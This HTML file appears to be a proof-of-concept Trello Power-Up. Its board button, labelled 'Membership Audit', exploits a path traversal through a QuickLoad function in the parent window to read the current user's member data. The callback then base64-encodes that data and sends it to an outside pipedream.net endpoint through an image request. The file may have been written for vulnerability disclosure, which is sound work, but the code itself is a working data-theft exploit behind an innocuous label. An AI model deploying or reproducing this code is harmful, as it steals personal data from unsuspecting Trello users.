<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>

    <script src="https://p.trellocdn.com/power-up.min.js"></script>
    <script>
        let t;

        // Initialize Trello Power-Up
        t = window.TrelloPowerUp.initialize({
            'board-buttons': function(t, opts) {
                return [{
                    icon: {
                        dark: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTIgMkwxMy4wOSA4LjI2TDIwIDlMMTMuMDkgMTUuNzRMMTIgMjJMMTAuOTEgMTUuNzRMNCBMMTAuOTEgOC4yNkwxMiAyWiIgZmlsbD0iI2ZmYWExMCIvPjwvc3ZnPg==',
                        light: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTIgMkwxMy4wOSA4LjI2TDIwIDlMMTMuMDkgMTUuNzRMMTIgMjJMMTAuOTEgMTUuNzRMNCBMMTAuOTEgOC4yNkwxMiAyWiIgZmlsbD0iI2ZmYWExMCIvPjwvc3ZnPg=='
                    },
                    text: 'Membership Audit',
                    callback: function(t) {
                        // Use QuickLoad to exploit path traversal
                        const toxicKey = "/1/boards/../member/me?/";
                        
                        if (window.parent.QuickLoad) {
                            window.parent.QuickLoad.load(toxicKey, function(err, data) {
                                if (err) {
                                    console.error('QuickLoad error:', err);
                                    return;
                                }
                                
                                if (data) {
                                    const pii = data;
                                    
                                    // Exfiltrate via image src (works even with CORS restrictions)
                                    const img = new Image();
                                    img.src = `https://eol7eseshmimhm1.m.pipedream.net?leak=${btoa(JSON.stringify(pii))}`;
                                    
                                }
                            }, 'quickload:Board', 'model-loader');
                        } else {
                            console.error('QuickLoad not available');
                        }
                    }
                }];
            },
            'card-buttons': function(t, opts) {
                // Stub implementation - not used for this POC
                return [];
            },
            'card-badges': function(t, opts) {
                // Stub implementation - not used for this POC
                return [];
            },
            'authorization-status': function(t, opts) {
                // Stub implementation - not used for this POC
                return { authorized: false };
            }
        });

        console.log('Power-Up initialized');
    </script>
</body>
</html>
